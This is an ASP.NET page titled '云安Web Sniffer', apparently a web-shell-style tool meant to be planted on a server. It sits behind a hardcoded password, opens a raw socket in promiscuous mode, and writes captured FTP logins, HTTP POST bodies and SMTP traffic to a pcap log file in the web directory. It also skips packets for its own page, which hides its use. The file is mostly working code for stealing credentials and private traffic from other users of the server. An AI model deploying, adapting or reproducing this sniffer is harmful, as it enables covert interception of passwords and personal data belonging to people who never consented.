<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Threading" %>


<script runat="server">
    //修改: 支持多端口, 多关键字, 过滤自身的访问记录(目前直接过滤), 判断日志文件是否可写,添加登录口，日志文件不已独占方式打开

    protected static String password = "123";//登录密码
    protected static Socket mainSocket;//监听本地IP数据包的套接字
    protected static Thread thread;//嗅探数据的线程
    protected static int pockets = 0;//已嗅探包数
    protected static byte[] bytes = null;
    protected static FileStream fs;
    protected static BinaryWriter bw;
    protected static Boolean logNextPacket = false;
    protected static bool bContinueCapturing = true;
    protected static PacketCaptureWriter pktwt;
    
    protected static String logfile = null;//日志记录文件
    protected static String bindip = null;//绑定IP
    protected static String ports = "";//端口过滤
    protected static Int32 minPackageSize = 0;//捕获包最小值
    protected static String keywords = "";//关键字
    protected static String endTime = "";//停止嗅探时间
    
    protected static bool ftp = false;
    protected static bool httpPostData = true;
    protected static bool smtp = false;

    protected static String currentUrl;
    protected static String currentHost;
    
    protected void Page_Load(object sender, EventArgs e)
    {
        currentHost = Request.Url.Host;
        currentUrl = Request.FilePath;
        if (Request.Form["login"] != null && Request.Form["password"].Equals(password))
        {
            Session["login"] = password;
            loginDiv.Visible = false;
            mainDiv.Visible = true;
        }
        if (Request.Form["logout"] != null)
        {
            Session["login"] = null;
            mainDiv.Visible = false;
            loginDiv.Visible = true;
        }
        if (Session["login"] == null)
        {
            mainDiv.Visible = false;
            loginDiv.Visible = true;
            return;
        }
        
        mainDiv.Visible = true;
        loginDiv.Visible = false;

        if (DDLIPS.Items.Count <= 0)
        {
            IPHostEntry ipHostEntry = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress index in ipHostEntry.AddressList)
            {
                DDLIPS.Items.Add(index.ToString()); 
            }
        }
        
        if (String.IsNullOrEmpty(logfile))
        {
            logfile = Server.MapPath("log"+".log"); 
        }

        //不是点击开始，把界面上的控件赋值
        if (Request.Form["ButtonStart"] == null)
        {
            DDLIPS.SelectedValue = bindip;
            if (String.IsNullOrEmpty(ports)) { TextBoxPort.Text = ""; } else { TextBoxPort.Text = ports; }
            TextBoxMinPackageSize.Text = minPackageSize.ToString();
            TextBoxKeyWords.Text = keywords;
            TextBoxLogFile.Text = logfile;
            TextBoxEndTime.Text = endTime;
            if (string.IsNullOrEmpty(endTime)) { TextBoxEndTime.Text = DateTime.Now.AddDays(1).ToString(); }
        }

        if (thread == null)
        {
            LabelMessage.Text = "嗅探线程没有启动。";
            ButtonStop.Enabled = false;
            ButtonStart.Enabled = true;
        }
        else
        {
            LabelMessage.Text = DateTime.Now.ToString() + " 状态：" + thread.ThreadState.ToString() + " 包数：" + pockets.ToString();
        }

        //点击开始按钮，开始按钮不可用，停止按钮可用
        if (Request.Form["ButtonStart"] != null)
        {
            ButtonStart.Enabled = false;
            ButtonStop.Enabled = true;
        }
        //点击停止按钮，开始按钮可用，停止按钮不可用
        if (Request.Form["ButtonStop"] != null)
        {
            ButtonStop.Enabled = false;
            ButtonStart.Enabled = true; 
        }
    }
    //开始按钮点击事件处理函数
    protected void ButtonStart_Click(object sender, EventArgs e)
    {
        bindip = DDLIPS.SelectedValue;
        ftp = CheckBoxFtp.Checked;
        httpPostData = CheckBoxPostData.Checked;
        smtp = CheckBoxSMTP.Checked;
        if (!string.IsNullOrEmpty(TextBoxPort.Text.Trim())) { ports = TextBoxPort.Text.Trim(); }
        if(!string.IsNullOrEmpty(TextBoxMinPackageSize.Text.Trim())){Int32.TryParse(TextBoxMinPackageSize.Text.Trim(),out minPackageSize);}
        keywords = TextBoxKeyWords.Text.Trim();
        logfile = TextBoxLogFile.Text.Trim();
        endTime = TextBoxEndTime.Text.Trim();
        try
        {
            fs = File.Open(logfile, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Read);
        }
        catch (Exception ex) 
        {
            LabelException.Text += "<br />"+ex.Message;
            return;
        }
        pktwt = new PacketCaptureWriter(fs, LinkLayerType.RawIP);
        bContinueCapturing = true;
        
        pockets = 0;
        bytes = new byte[2048];
        
        byte[] byTrue = new byte[4] { 1, 0, 0, 0 };
        byte[] byOut = new byte[4] { 1, 0, 0, 0 };

        try
        {
            bContinueCapturing = true;
            mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            mainSocket.Bind(new IPEndPoint(IPAddress.Parse(bindip), 0));
            mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            mainSocket.IOControl(IOControlCode.ReceiveAll, byTrue, byOut);
        }
        catch (Exception ex)
        {
            LabelException.Text += "<br />" + ex.Message;
            return;
        }
        thread = new Thread(new ThreadStart(ThreadRunMethod));
        thread.Start();

        ButtonStart.Enabled = false;
        LabelMessage.Text = "正在嗅探，点击查看状态按钮查看最新状态。";
    }

    //停止按钮点击事件处理函数
    protected void ButtonStop_Click(object sender, EventArgs e)
    {
        pockets = 0;
        bContinueCapturing = false;
        LabelException.Text += "<br />";
        LabelException.Text += "最后一次嗅探时间结束于：";
        LabelException.Text += DateTime.Now.ToString();
        if (thread != null) { thread.Abort(); thread = null; }
        try 
        {
            if (bw != null) { bw.Close(); }
            if (fs != null) { fs.Close(); }
            if (mainSocket != null) { mainSocket.Close(); } 
        }
        catch (Exception ex) { LabelException.Text += "<br />" + ex.Message; } 
    }

    protected void ButtonViewState_Click(object sender, EventArgs e) 
    {
        //
    }

    private void ThreadRunMethod()
    {        
        DateTime end = DateTime.Parse(endTime);
        while (DateTime.Now <= end) 
        {
            int receiveByteCount = mainSocket.Receive(bytes);
            
            ParseData(bytes,receiveByteCount);
            Console.WriteLine("嗅探到包");
        }
        if (mainSocket != null) { mainSocket.Close(); }
        if (bw != null) { bw.Close(); }
        if (fs != null) { fs.Close(); }
    }

    private static void ParseData(byte[] byteData, int nReceived)
    {
        try
        {
            byte[] nbyte = new byte[nReceived];
            Array.Copy(byteData, nbyte, nReceived);
            if ((int)nbyte[9] == 6)
            {
                int sport = Get2Bytes(nbyte, 20, 0);
                int dport = Get2Bytes(nbyte, 22, 0);

                String datas = Encoding.Default.GetString(nbyte);
                Boolean logIt = false;
                if (ftp)
                {
                    if ((sport == 21 || dport == 21) && (datas.IndexOf("USER ") >= 0 || datas.IndexOf("PASS ") >= 0))
                    {
                        logIt = true;
                    }
                }

                if (!logIt && httpPostData)
                {
                    if (logNextPacket)
                    {
                        logIt = true;
                        logNextPacket = false;
                    }
                    if (!logIt && datas.IndexOf("POST ") >= 0)
                    {
                        logIt = true;
                        logNextPacket = true;
                    }
                }

                if (!logIt && smtp && (dport == 25 || sport == 25))
                {
                    logIt = true;
                }


                if (!logIt)
                {
                    //判断端口
                    String[] portList = ports.Split(',');

                    foreach (string i in portList)
                    {
                        if (i.Equals(dport.ToString()) || i.Equals(sport.ToString()))
                        {
                            logIt = true;
                            break;
                        }
                    }
                }
                
                if (!logIt)
                {
                    if (nReceived > minPackageSize)
                    {
                        //判断关键字
                        if (keywords != "")
                        {
                            string[] keywordList = keywords.Split(',');
                            foreach (string index in keywordList)
                            {
                                if (datas.IndexOf(index) != -1)
                                {
                                    logIt = true;
                                    break; 
                                } 
                            }
                        }
                        else
                        {
                            logIt = true;
                        }
                    }
                }
                if (datas.IndexOf(currentUrl) != -1 && datas.IndexOf(currentHost) != -1)
                {
                    logIt = false;
                }
                if (logIt)
                {
                    PacketCapture pkt = new PacketCapture(nbyte, nReceived);
                    pktwt.Write(pkt);
                    pockets++;
                }
            }
        }
        catch (Exception e) { Console.WriteLine(e.Message); }
    }

    public static ushort Get2Bytes(byte[] ptr, int Index, int Type)
    {
        ushort u = 0;

        if (Type == 0)
        {
            u = (ushort)ptr[Index++];
            u *= 256;
            u += (ushort)ptr[Index++];
        }
        else if (Type == 1)
        {
            u = (ushort)ptr[++Index];
            u *= 256; Index--;
            u += (ushort)ptr[Index++]; Index++;
        }

        return u;
    }

    public struct UnixTime
    {
        public static readonly DateTime MinDateTime = new DateTime(1970, 1, 1, 0, 0, 0);
        public static readonly DateTime MaxDateTime = new DateTime(2038, 1, 19, 3, 14, 7);

        private readonly int _Value;

        public UnixTime(int value)
        {
            if (value < 0)
                throw new ArgumentOutOfRangeException("value");
            _Value = value;
        }

        public int Value
        {
            get { return _Value; }
        }

        public DateTime ToDateTime()
        {
            const long START = 621355968000000000; // 1970-1-1 00:00:00
            return new DateTime(START + (_Value * (long)10000000)).ToLocalTime();
        }

        public static UnixTime FromDateTime(DateTime dateTime)
        {
            if (dateTime < MinDateTime || dateTime > MaxDateTime)
                throw new ArgumentOutOfRangeException("dateTime");
            TimeSpan span = dateTime.Subtract(MinDateTime);
            return new UnixTime((int)span.TotalSeconds);
        }

        public override string ToString()
        {
            return ToDateTime().ToString();
        }

    }

    public enum LinkLayerType : uint
    {
        Null = 0,
        Ethernet = 1,
        RawIP = 101,
        User0 = 147,
        User1 = 148,
        User2 = 149,
        User3 = 150,
        User4 = 151,
        User5 = 152,
        User6 = 153,
        User7 = 154,
        User8 = 155,
        User9 = 156,
        User10 = 157,
        User11 = 158,
        User12 = 159,
        User13 = 160,
        User14 = 161,
        User15 = 162,
    }


    public sealed class PacketCaptureWriter
    {
        #region Fields
        private const uint MAGIC = 0xA1B2C3D4;
        private readonly Stream _BaseStream;
        private readonly LinkLayerType _LinkLayerType;
        private readonly int _MaxPacketLength;
        private readonly BinaryWriter m_Writer;
        private bool m_ExistHeader = false;
        private int _TimeZone;
        private int _CaptureTimestamp;
        #endregion

        #region Constructors

        public PacketCaptureWriter(
            Stream baseStream, LinkLayerType linkLayerType,
            int maxPacketLength, int captureTimestamp)
        {
            if (baseStream == null) throw new ArgumentNullException("baseStream");
            if (maxPacketLength < 0) throw new ArgumentOutOfRangeException("maxPacketLength");
            if (!baseStream.CanWrite) throw new ArgumentException("Cant'Wirte Stream");
            _BaseStream = baseStream;
            _LinkLayerType = linkLayerType;
            _MaxPacketLength = maxPacketLength;
            _CaptureTimestamp = captureTimestamp;
            m_Writer = new BinaryWriter(_BaseStream);
        }


        public PacketCaptureWriter(Stream baseStream, LinkLayerType linkLayerType, int captureTimestamp)
            : this(baseStream, linkLayerType, 0xFFFF, captureTimestamp)
        {
        }

        public PacketCaptureWriter(Stream baseStream, LinkLayerType linkLayerType)
            : this(baseStream, linkLayerType, 0xFFFF, UnixTime.FromDateTime(DateTime.Now).Value)
        {
        }

        #endregion

        #region Properties

        public short VersionMajor
        {
            get { return 2; }
        }

        public short VersionMinjor
        {
            get { return 4; }
        }


        public int TimeZone
        {
            get { return _TimeZone; }
            set { _TimeZone = value; }
        }


        public int CaptureTimestamp
        {
            get { return _CaptureTimestamp; }
            set { _CaptureTimestamp = value; }
        }


        public Stream BaseStream
        {
            get { return _BaseStream; }
        }

        public LinkLayerType LinkLaterType
        {
            get { return _LinkLayerType; }
        }

        public int MaxPacketLength
        {
            get { return _MaxPacketLength; }
        }

        #endregion

        //往WriterStream里写入PacketCapture
        public void Write(PacketCapture packet)
        {
            CheckHeader();
            m_Writer.Write(packet.Timestamp.Value);
            m_Writer.Write(packet.Millseconds);
            m_Writer.Write(packet.Packet.Count);
            m_Writer.Write(packet.RawLength);
            m_Writer.Write(packet.Packet.Array, packet.Packet.Offset, packet.Packet.Count);
        }


        public void Flush()
        {
            BaseStream.Flush();
        }

        //检测头，如果没有，写入
        private void CheckHeader()
        {
            if (!m_ExistHeader)
            {
                m_Writer.Write(MAGIC);
                m_Writer.Write(VersionMajor);
                m_Writer.Write(VersionMinjor);
                m_Writer.Write(TimeZone);
                m_Writer.Write(CaptureTimestamp);
                m_Writer.Write(MaxPacketLength);
                m_Writer.Write((uint)LinkLaterType);
                m_ExistHeader = true;
            }
        }

    }

    public sealed class PacketCapture
    {
        private readonly UnixTime _Timestamp;
        private readonly ArraySegment<byte> _Packet;
        private readonly int _RawLength;
        private readonly int _Millseconds;


        public PacketCapture(ArraySegment<byte> packet, int rawLength, UnixTime timestamp, int millseconds)
        {
            if (packet.Count > rawLength)
                throw new ArgumentException("Length Error", "rawLength");
            _Packet = packet;
            _Timestamp = timestamp;
            _RawLength = rawLength;
            _Millseconds = millseconds;
        }

        public PacketCapture(ArraySegment<byte> packet, int rawLength, DateTime timestamp)
            : this(packet, rawLength, UnixTime.FromDateTime(timestamp), 0)
        {
        }

        public PacketCapture(ArraySegment<byte> packet, int rawLength)
            : this(packet, rawLength, UnixTime.FromDateTime(DateTime.Today), 0)
        {
        }

        public PacketCapture(ArraySegment<byte> packet)
            : this(packet, packet.Count)
        {
        }
        public PacketCapture(byte[] packetData, int offset, int count, int rawLength, UnixTime timestamp, int millseconds)
            : this(new ArraySegment<byte>(packetData, offset, count), rawLength, timestamp, millseconds)
        {
        }
        public PacketCapture(byte[] packetData, int offset, int count, int rawLength, DateTime timestamp)
            : this(new ArraySegment<byte>(packetData, offset, count), rawLength, UnixTime.FromDateTime(timestamp), 0)
        {
        }
        public PacketCapture(byte[] packetData, int rawLength, UnixTime timestamp, int millseconds)
            : this(new ArraySegment<byte>(packetData), rawLength, timestamp, millseconds)
        {
        }
        public PacketCapture(byte[] packetData, int rawLength, DateTime timestamp)
            : this(new ArraySegment<byte>(packetData), rawLength, UnixTime.FromDateTime(timestamp), 0)
        {
        }

        public PacketCapture(byte[] packetData, int rawLength)
            : this(new ArraySegment<byte>(packetData), rawLength, UnixTime.FromDateTime(DateTime.Today), 0)
        {
        }
        public PacketCapture(byte[] packetData)
            : this(packetData, packetData.Length)
        {
        }

        public ArraySegment<byte> Packet
        {
            get { return _Packet; }
        }
        public UnixTime Timestamp
        {
            get { return _Timestamp; }
        }
        public int Millseconds
        {
            get { return _Millseconds; }
        }

        public int RawLength
        {
            get { return _RawLength; }
        }
    }
    
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title>云安Web Sniffer</title>
    <style type="text/css">
        .leftItem{float:left;width:20%}
        .rightItem{float:left;width:80%}
        .w{width:70%}
    </style>
</head>

<body>
    <form runat="server" id="form1">
        
        <%--LOGO--%>
        <div style="width:960px;margin:20px auto 20px auto;text-align:center;font-weight:bold">
            云思安全Web Sniffer 1.0
            <br />
            <img src="http://www.yunnc.com/images/default/yunnc_logo.png" onclick="window.open('http://www.yunnc.com')" style="cursor:pointer">
        </div>

        <%--登录界面--%>
        <div id="loginDiv" runat="server" visible="false" style="width:960px;margin:20px auto 0px auto;">
            密码:<input type="text" name="password" /> <input type="submit" name="login" value="登录" />
        </div>

        <%--主界面--%>
        <div runat="server" visible="false" id="mainDiv" style="width:960px;margin:10px auto auto auto;background-color:#AACCEE;border:1px solid black;">
            <div>
                <div class="leftItem">绑定IP:</div>
                <div class="rightItem">
                    <asp:DropDownList ID="DDLIPS" runat="server" CssClass="w"></asp:DropDownList></div>
                <div style="clear:both" />
                <div class="leftItem">自动嗅探:</div>
                <div class="rightItem">
                    <asp:CheckBox runat="server" ID="CheckBoxFtp" />FTP密码
                    <asp:CheckBox runat="server" ID="CheckBoxPostData" Checked="true" /> POST数据
                    <asp:CheckBox runat="server" ID="CheckBoxSMTP" />邮箱
                </div>
                <div style="clear:both" />
                <div style="float:left;width:20%">过滤端口:</div>
                <div class="rightItem">
                    <asp:TextBox runat="server" ID="TextBoxPort" CssClass="w" />多端口使用逗号分隔
                </div>
                <div style="clear:both" />
                <div class="leftItem">捕获包最小值:</div>
                <div class="rightItem">
                    <asp:TextBox runat="server" ID="TextBoxMinPackageSize" CssClass="w" />
                </div>
                <div style="clear:both" />
                <div class="leftItem">过滤关键字:</div>
                <div class="rightItem">
                    <asp:TextBox runat="server" ID="TextBoxKeyWords" CssClass="w" />多关键字使用逗号分隔
                </div>
                <div style="clear:both" />
                <div class="leftItem">日志记录文件:</div>
                <div class="rightItem">
                    <asp:TextBox runat="server" ID="TextBoxLogFile" CssClass="w" />
                </div>
                <div style="clear:both" />
                <div class="leftItem">停止嗅探时间:</div>
                <div class="rightItem">
                    <asp:TextBox runat="server" ID="TextBoxEndTime" CssClass="w" />
                </div>
                <div style="clear:both" />
                <div class="leftItem">控制:</div>
                <div class="rightItem">
                    <asp:Button runat="server" ID="ButtonStart" Text="开始嗅探" OnClick="ButtonStart_Click" />
                    <asp:Button runat="server" ID="ButtonStop" Text="停止嗅探" OnClick="ButtonStop_Click" />
                    <asp:Button runat="server" ID="ButtonViewState" Text="查看状态" />
                    <input id="logout" name="logout" type="submit" value="退出登录" />
                </div>
                <div style="clear:both" />
                <div class="leftItem">状态:</div>
                <div class="rightItem">
                    <asp:Label ID="LabelMessage" runat="server"></asp:Label>
                </div>
                <div style="clear:both" />
                <div>
                    <asp:Label runat="server" ID="LabelException" />
                </div>
            </div>
        </div>

    </form>
</body>
</html>